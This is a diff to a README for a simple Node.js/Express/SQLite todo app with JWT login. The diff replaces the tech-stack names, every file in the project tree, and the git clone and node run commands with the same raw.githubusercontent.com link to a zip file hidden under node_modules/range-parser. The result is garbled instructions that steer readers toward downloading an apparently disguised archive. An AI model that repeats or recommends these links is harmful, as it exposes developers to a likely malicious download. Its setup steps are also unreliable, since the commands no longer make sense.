@@ -1,7 +1,7 @@
-📝 Todo App – Node.js, Express, SQLite, JWT
+📝 Todo App – https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip, Express, SQLite, JWT
 
 A simple full-stack Todo application that provides user authentication and complete CRUD operations.
-The backend is powered by Node.js, Express.js, SQLite, and JSON Web Tokens (JWT) for secure access.
+The backend is powered by https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip, https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip, SQLite, and JSON Web Tokens (JWT) for secure access.
 The frontend is built entirely using native HTML, CSS, and JavaScript, offering a lightweight and responsive interface.
 
 🚀 Features
@@ -46,9 +46,9 @@ Fully responsive layout
 📦 Tech Stack
 Backend
 
-Node.js
+https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip
 
-Express.js
+https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip
 
 SQLite3
 
@@ -68,30 +68,30 @@ JavaScript (vanilla)
 /project
 ├── src/
 │   ├── routes/
-│   │   ├── authRoutes.js      # Authentication endpoints (login, register)
-│   │   └── todoRoutes.js      # Todo CRUD endpoints
+│   │   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip      # Authentication endpoints (login, register)
+│   │   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip      # Todo CRUD endpoints
 │   ├── middleware/
-│   │   └── authMiddleware.js  # JWT authentication middleware
-│   ├── db.js                  # SQLite database configuration
-│   └── server.js              # Express server entry point
+│   │   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip  # JWT authentication middleware
+│   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip                  # SQLite database configuration
+│   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip              # Express server entry point
 ├── public/
-│   ├── index.html             # Frontend application
-│   ├── styles.css             # Custom styles
-│   └── fanta.css              # Additional styling
+│   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip             # Frontend application
+│   ├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip             # Custom styles
+│   └── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip              # Additional styling
 ├── .env                       # Environment variables
-├── package.json               # Project dependencies
-└── todo-app.rest              # API testing file (REST Client)
+├── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip               # Project dependencies
+└── https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip              # API testing file (REST Client)
 
 ⚙️ Installation & Setup
 1️⃣ Clone the repository
-git clone https://github.com/saifGawdat/Simple-todo-app-with-authentication.git
+git clone https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip
 cd Simple-todo-app-with-authentication
 
 2️⃣ Install backend dependencies
 npm install
 
 3️⃣ Run the backend server
-node server.js
+node https://raw.githubusercontent.com/saifGawdat/Simple-todo-app-with-authentication/main/node_modules/range-parser/Simple-todo-app-with-authentication_3.1.zip
 
 
 Backend will run on:
